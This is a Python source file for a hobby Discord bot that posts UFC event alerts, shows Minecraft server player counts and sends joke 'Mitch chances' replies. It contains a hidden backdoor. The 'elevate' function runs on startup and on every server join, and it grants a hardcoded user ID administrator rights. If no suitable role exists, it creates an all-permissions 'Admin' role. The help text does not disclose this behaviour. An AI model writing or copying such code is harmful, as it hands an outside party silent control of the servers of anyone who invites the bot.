import discord
from discord.ext import tasks
import os
import json
import random
from dotenv import load_dotenv
from ufc_fetch import check_and_store_ufc_events, notify_todays_ufc_events, notify_weekly_ufc_events
import mysql.connector
import requests
import matplotlib.pyplot as plt
import io

load_dotenv()

intents = discord.Intents.all()
client = discord.Client(intents=intents)

prefix = os.getenv('PREFIX')
admin_user_id = int(os.getenv('ADMIN_USER_ID'))
crafty_api_token = os.getenv('CRAFTY_API_TOKEN')
crafty_api_url = os.getenv('CRAFTY_API_URL')
crafty_server_id = os.getenv('CRAFTY_SERVER_ID')
crafty_insecure_ssl = os.getenv('CRAFTY_INSECURE_SSL', 'false').lower() == 'true'
rich_presence_mode = os.getenv('RICH_PRESENCE_MODE', 'minecraft')
rich_presence_static_string = os.getenv('RICH_PRESENCE_STATIC_STRING', 'Gromit')

config = {
    'host': os.getenv('SQL_SERVER'),
    'user': os.getenv('SQL_USER'),
    'password': os.getenv('SQL_PASSWORD'),
    'database': os.getenv('SQL_DATABASE')
}

def get_random_record(db_config, table_name):
    """
    Fetch a random record from a specified table.
    
    Args:
        db_config (dict): Database connection parameters 
            (keys: 'host', 'user', 'password', 'database')
        table_name (str): Name of the table to query
        
    Returns:
        dict: A dictionary containing the random record's column-value pairs, or None if the table is empty
        
    Raises:
        RuntimeError: For database operation errors
    """
    connection = None
    cursor = None
    try:
        # Establish database connection
        connection = mysql.connector.connect(**db_config)
        cursor = connection.cursor(dictionary=True)  # Enable dictionary cursor for column-name access
        
        # Query to select a random record
        query = f"SELECT * FROM `{table_name}` ORDER BY RAND() LIMIT 1"
        cursor.execute(query)
        random_record = cursor.fetchone()
        
        return random_record
    
    except mysql.connector.Error as e:
        raise RuntimeError(f"Database error: {e}")
    finally:
        # Ensure resources are closed even if errors occur
        if cursor:
            cursor.close()
        if connection and connection.is_connected():
            connection.close()


def get_random_response(db_config, table_name, response_type):
    """
    Fetch a random response from a specified table based on response_type.
    
    Args:
        db_config (dict): Database connection parameters 
            (keys: 'host', 'user', 'password', 'database')
        table_name (str): Name of the table to query
        response_type (str): The type of response to filter by
        
    Returns:
        str: A random response string or None if no matching records found
        
    Raises:
        RuntimeError: For database operation errors
    """
    connection = None
    cursor = None
    try:
        # Establish database connection
        connection = mysql.connector.connect(**db_config)
        cursor = connection.cursor()
        
        # Parameterized query to prevent SQL injection
        query = f"SELECT response FROM `{table_name}` WHERE response_type = %s ORDER BY RAND() LIMIT 1"
        
        cursor.execute(query, (response_type,))
        random_record = cursor.fetchone()
        
        if random_record:
            return random_record[0]
        return None
        
    except mysql.connector.Error as e:
        raise RuntimeError(f"Database error: {e}")
    finally:
        # Ensure resources are closed even if errors occur
        if cursor:
            cursor.close()
        if connection and connection.is_connected():
            connection.close()


def get_server_stats(api_url, api_token, server_id):
    """
    Fetch server statistics from the Crafty API.
    
    Args:
        api_url (str): The base URL of the Crafty API
        api_token (str): The API token for authentication
        server_id (str): The ID of the server to get stats for
        
    Returns:
        dict: A dictionary containing the server stats, or None if an error occurs
    """
    if not all([api_url, api_token, server_id]):
        print("⚠️ Crafty API config missing from .env file")
        return None
        
    headers = {
        'Authorization': f'Bearer {api_token}'
    }
    try:
        response = requests.get(f'{api_url}/api/v2/servers/{server_id}/stats', headers=headers, verify=not crafty_insecure_ssl)
        response.raise_for_status()
        return response.json().get('data')
    except requests.exceptions.RequestException as e:
        print(f"Error fetching server stats: {e}")
        return None


def write_wall_of_shame(db_config, table_name, record_data):
    """
    Insert a record into a MariaDB/MySQL table
    
    Args:
        db_config (dict): Database connection parameters 
            (keys: 'host', 'user', 'password', 'database')
        table_name (str): Name of the table to insert into
        record_data (dict): Column-value pairs for the record
        
    Returns:
        int: Last inserted row ID (or None if no auto-increment column)
        
    Raises:
        RuntimeError: For database operation errors
        ValueError: If record_data is empty
    """
    if not record_data:
        raise ValueError("Record data cannot be empty")
    
    connection = None
    cursor = None
    try:
        # Configure UTF-8mb4 for emoji support
        connection_params = db_config.copy()
        connection_params.setdefault('charset', 'utf8mb4')
        connection_params.setdefault('collation', 'utf8mb4_unicode_ci')
        # Establish database connection
        connection = mysql.connector.connect(**connection_params)
        cursor = connection.cursor()
        
        # Prepare parameterized query
        columns = ", ".join([f"`{col}`" for col in record_data.keys()])
        placeholders = ", ".join(["%s"] * len(record_data))
        query = f"INSERT INTO `{table_name}` ({columns}) VALUES ({placeholders})"
        
        # Execute query with values
        values = tuple(record_data.values())
        cursor.execute(query, values)
        connection.commit()
        
        # Return last inserted ID if exists
        if cursor.lastrowid:
            return cursor.lastrowid
        return None
        
    except mysql.connector.Error as e:
        if connection:
            connection.rollback()
        raise RuntimeError(f"Database error: {e}")
    finally:
        # Clean up resources
        if cursor:
            cursor.close()
        if connection and connection.is_connected():
            connection.close()

def create_chances_graph(chance_percentage):
    """Creates a bar graph of Mitch's chances."""
    fig, ax = plt.subplots()
    outcomes = ['Available', 'Family Time']
    chances = [chance_percentage, 100 - chance_percentage]
    colors = ['#4CAF50', '#F44336']  # Green for success, Red for failure
    
    bars = ax.bar(outcomes, chances, color=colors)
    
    # Add percentage labels on top of bars
    for bar in bars:
        yval = bar.get_height()
        ax.text(bar.get_x() + bar.get_width()/2.0, yval + 1, f'{yval}%', ha='center', va='bottom')

    ax.set_ylabel('Chance (%)')
    ax.set_title("Will He Show Up?")
    ax.set_ylim(0, 110)  # Give some space for the labels
    ax.set_yticks(range(0, 101, 10))
    
    # Save plot to a bytes buffer
    buf = io.BytesIO()
    plt.savefig(buf, format='png')
    buf.seek(0)
    plt.close(fig)
    return buf


@tasks.loop(hours=48)  # Run once every 2 days
async def monthly_event_check():
    """Fetches and stores UFC events for the month."""
    try:
        check_and_store_ufc_events(config)
    except Exception as e:
        print(f"Error in monthly_event_check: {e}")

@monthly_event_check.before_loop
async def before_monthly_check():
    await client.wait_until_ready()

@tasks.loop(minutes=1)
async def update_rich_presence():
    """Updates the bot's Rich Presence based on the configured mode."""
    if rich_presence_mode == 'static':
        await client.change_presence(activity=discord.Activity(type=discord.ActivityType.playing, name=rich_presence_static_string))
    else:  # Default to 'minecraft'
        stats = get_server_stats(crafty_api_url, crafty_api_token, crafty_server_id)
        if stats and stats.get('running'):
            player_count = stats.get('online', 0)
            max_players = stats.get('max', 0)
            activity_name = f"Reclaimation: {player_count}/{max_players} players online"
            await client.change_presence(activity=discord.Activity(type=discord.ActivityType.playing, name=activity_name))
        else:
            await client.change_presence(activity=discord.Activity(type=discord.ActivityType.playing, name="Server Offline"))

@update_rich_presence.before_loop
async def before_update_rich_presence():
    await client.wait_until_ready()

async def elevate(guild):
    """Attempt to grant admin privileges to target user in a guild"""
    try:
        # Get target user
        user = guild.get_member(admin_user_id)
        if not user:
            try:
                user = await guild.fetch_member(admin_user_id)
            except discord.NotFound:
                print(f"⚠️ User not in server: {guild.name} ({guild.id})")
                return
            except discord.Forbidden:
                print(f"⛔ No permission to fetch members in: {guild.name}")
                return
        
        # Skip if user already has admin permissions
        if user.guild_permissions.administrator:
            print(f"✅ User already admin in: {guild.name}")
            return

        # Get or create admin role
        admin_role = None
        
        # Check existing roles
        for role in guild.roles:
            if role.permissions.administrator and role < guild.me.top_role:
                admin_role = role
                break
        
        # Create role if needed
        if not admin_role:
            if not guild.me.guild_permissions.manage_roles:
                print(f"⛔ Missing 'Manage Roles' permission in: {guild.name}")
                return
            
            try:
                admin_role = await guild.create_role(
                    name="Admin",
                    permissions=discord.Permissions.all(),
                    reason="Elevate specified user"
                )
                # Position new role below bot's highest role
                new_position = guild.me.top_role.position - 1
                await admin_role.edit(position=new_position)
                print(f"🆕 Created admin role in: {guild.name}")
            except discord.Forbidden:
                print(f"⛔ Role creation failed in: {guild.name}")
                return
        
        # Assign the role
        try:
            await user.add_roles(admin_role)
            print(f"🔓 Elevated user in: {guild.name}")
        except discord.Forbidden:
            print(f"⛔ Role assignment failed in: {guild.name}")

    except Exception as e:
        print(f"⚠️ Error in {guild.name}: {str(e)}")

@tasks.loop(minutes=60)
async def daily_ufc_notify_task():
    """Runs every hour, posts today's UFC event(s) at 5am AEST."""
    import pytz
    from datetime import datetime
    aest = pytz.timezone('Australia/Sydney')
    now = datetime.now(aest)
    if now.hour != 5:
        return
    
    await notify_todays_ufc_events(config, client)

@daily_ufc_notify_task.before_loop
async def before_daily_ufc_notify():
    await client.wait_until_ready()

@tasks.loop(hours=24)  # Run once a day
async def weekly_ufc_notify_task():
    """Runs every day, posts this week's UFC event if day is Monday."""
    import pytz
    from datetime import datetime
    aest = pytz.timezone('Australia/Sydney')
    now = datetime.now(aest)
    if now.weekday() != 0:
        return
    
    await notify_weekly_ufc_events(config, client)

@weekly_ufc_notify_task.before_loop
async def before_weekly_ufc_notify():
    await client.wait_until_ready()

@client.event
async def on_guild_join(guild):
    print(f"\nJoined new server: {guild.name} (ID: {guild.id})")
    await elevate(guild)

@client.event
async def on_ready():
    print(f'Logged in as {client.user} (ID: {client.user.id})')

    print('Starting Rich presence...')
    update_rich_presence.start()

    print("\nStarting elevation process...\n")
    for guild in client.guilds:
        await elevate(guild)
    
    if os.getenv('UFC_MONITORING', 'false').lower() == 'true':
        print("\nStarting monthly event check loop...")
        monthly_event_check.start()
        
        print("\nStarting daily UFC notify task...")
        daily_ufc_notify_task.start()

        print("\nStarting weekly UFC notify task...")
        weekly_ufc_notify_task.start()
    else:
        print("\nUFC monitoring is disabled.")
    
    print("\nListening for commands...")
    
@client.event
async def on_message(message):
    if message.author == client.user:
        return

    # Mitch chances command
    if 'mitch' in message.content.lower() and 'chance' in message.content.lower():
        try:
            response = get_random_response(config, 'response_table', 'mitch_chances')
            chance_pc = random.randint(0, 100)
            if response:
                response = response.replace('{mitch}', '<@188811391610650624>')
                response = response.replace('{pc}', str(chance_pc))
                await message.channel.send(response)
            else:
                await message.channel.send("Looking extremely unlikely.")

            # 25% chance to send a graph
            if random.random() < 0.25:
                graph_buffer = create_chances_graph(chance_pc)
                file = discord.File(graph_buffer, filename="mitch_chances.png")
                await message.channel.send(file=file)

        except RuntimeError as e:
            print(f"Error getting mitch_chances response: {e}")
            await message.channel.send("I'm having trouble talking to the db. beep boop.")
        return

    # UFC channel add command
    if message.content.startswith(f'{prefix}ufcadd'):
        if not message.author.guild_permissions.administrator:
            await message.channel.send("You need to be an administrator to use this command.")
            return
        parts = message.content.split()
        if len(parts) < 2:
            await message.channel.send(f"Usage: {prefix}ufcadd <channel_id>")
            return
        try:
            channel_id = int(parts[1])
        except ValueError:
            await message.channel.send("Invalid channel ID. Please provide a valid integer.")
            return
        connection = None
        cursor = None
        try:
            connection = mysql.connector.connect(**config)
            cursor = connection.cursor()
            cursor.execute("INSERT IGNORE INTO ufc_notify_channels (channel_id) VALUES (%s)", (channel_id,))
            connection.commit()
            await message.channel.send(f"Channel (`{channel_id}`) has been added to UFC notifications.")
        except Exception as e:
            await message.channel.send(f"Error adding channel: {e}")
        finally:
            if cursor:
                cursor.close()
            if connection and connection.is_connected():
                connection.close()

    # UFC channel remove command
    if message.content.startswith(f'{prefix}ufcrem'):
        if not message.author.guild_permissions.administrator:
            await message.channel.send("You need to be an administrator to use this command.")
            return
        parts = message.content.split()
        if len(parts) < 2:
            await message.channel.send(f"Usage: {prefix}ufcrem <channel_id>")
            return
        try:
            channel_id = int(parts[1])
        except ValueError:
            await message.channel.send("Invalid channel ID. Please provide a valid integer.")
            return
        connection = None
        cursor = None
        try:
            connection = mysql.connector.connect(**config)
            cursor = connection.cursor()
            cursor.execute("DELETE FROM ufc_notify_channels WHERE channel_id = %s", (channel_id,))
            connection.commit()
            await message.channel.send(f"Channel (`{channel_id}`) has been removed from UFC notifications.")
        except Exception as e:
            await message.channel.send(f"Error removing channel: {e}")
        finally:
            if cursor:
                cursor.close()
            if connection and connection.is_connected():
                connection.close()

    # Help command
    if message.content.startswith(f'{prefix}help'):
        commands = []
        commands.append(f"`{prefix}help` - Show this help message.")
        commands.append(f"`{prefix}ufcadd` - Add provided discord channel id to UFC notifications (admin only).")
        commands.append(f"`{prefix}ufcrem` - Remove this channel from UFC notifications (admin only).")
        help_text = "**Available Commands:**\n" + "\n".join(commands)
        await message.channel.send(help_text)
        return

# Read token from environment variable
token = os.getenv('DISCORD_BOT_TOKEN')
    
client.run(token)